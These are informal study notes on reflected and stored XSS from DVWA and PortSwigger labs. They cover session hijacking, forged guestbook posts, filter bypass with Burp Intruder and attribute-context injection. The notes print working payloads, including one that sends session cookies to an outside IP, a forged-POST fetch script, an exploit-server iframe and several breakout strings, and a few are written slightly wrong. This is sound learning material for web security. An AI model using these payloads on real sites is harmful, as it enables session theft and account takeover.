

## XSS attack 1:Session hijacking:

ollowing a successful app login, the server will send you a **session cookie** via the `set-cookie` header. If you want to access any page within the application or submit a form, the cookie (now stored in the browser) is also included in **all the requests** sent to the server. This way, the server will know who you are.

Session cookies are sensitive information that, if compromised, may allow an attacker to impersonate the legitimate user and gain access to their existing web session. This attack is commonly known as **session hijacking**.

When the flag `HttpOnly` is missing, the JavaScript code running in the browser can access the session cookies by invoking the document. cookie.

```
http://localhost:81/vulnerabilities/xss_r/?name=<script>alert(document.cookies)<script/>
```

```
http://localhost:81/vulnerabilities/xss_r/?name=<script>new  
Image().src="http://192.168.0.252:82/bogus.php?output="+document.cookie;</script>
```

The following payload creates a new _Image_ object in the DOM of the current page and sets the `src` attribute to the attacker’s website. As a result, the browser makes an HTTP request to this external website (`192.168.149.128`) with the URL containing the session cookie.


### XSS attack 2: Performing unauthorized activities:

If the `HttpOnly` cookie attribute is set, we cannot steal the cookies through JavaScript. However, using the initial XSS attack, you can still perform unauthorized actions in the application on behalf of the user.

For instance, in this attack scenario, we will post a new message in the Guestbook on behalf of the victim, without their consent. For this, you need to forge an HTTP POST request to the guestbook page with the appropriate parameters using JavaScript.

The following payload will do this by using the `fetch` API:

<script>
fetch('http://localhost:81/vulnerabilities/xss_s/', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: 'txtName=xss&mtxMessage=xss&btnSign=Sign+Guestbook'
})
</script>

this will create the post to the **Damn Vulnerable Web Application (DVWA)** or a similar app running at `http://localhost:81`. with the name =xss and then message =xss and submit the button .  if the user visit the page the malcious payload will be executed ..


lab 1:
**the basic XSS script with the alert function is <script>alert('XSS')</script>**

## Impact of reflected XSS attacks

If an attacker can control a script that is executed in the victim's browser, then they can typically fully compromise that user. Amongst other things, the attacker can:

- Perform any action within the application that the user can perform.
- View any information that the user is able to view.
- Modify any information that the user is able to modify.
- Initiate interactions with other application users, including malicious attacks, that will appear to originate from the initial victim user.

# lab:Reflected XSS into HTML context with most tags and attributes blocked

in this lab they says that most tags and attribute are blocked , it means some tags and attribute are there still exist , we need to find by burp intruder 
in GET /search=<$> go to the payload and then paste the payload from the cheatsheet 
and start attack and then same for the attribute and then go to the exploit server `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>`
and then click the sent to user 


	
## XSS in HTML tag attributes:

in the website the html tags is somethings like 
<input type="text" value="{USER_INPUT}">

# Reflected XSS into attribute with angle brackets HTML-encoded:

in the most of  the website the payload is injected in the attributes like --> <input value="test">

in this case we can inject payload like `" autofocus onfocus=alert(document.domain) x="`
but often we may need to change the order like " onfocus=alert(1) autofocus x="

in case the text value in embedded into the html tags we use `"><script>alert(document.domain)</script>` or <input value="&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;">


Sometimes the XSS context is into a type of HTML tag attribute that itself can create a scriptable context. Here, you can execute JavaScript without needing to terminate the attribute value. For example, if the XSS context is into the `href` attribute of an anchor tag, you can use the `javascript` pseudo-protocol to execute script. For example:

`<a href="javascript:alert(document.domain)">`
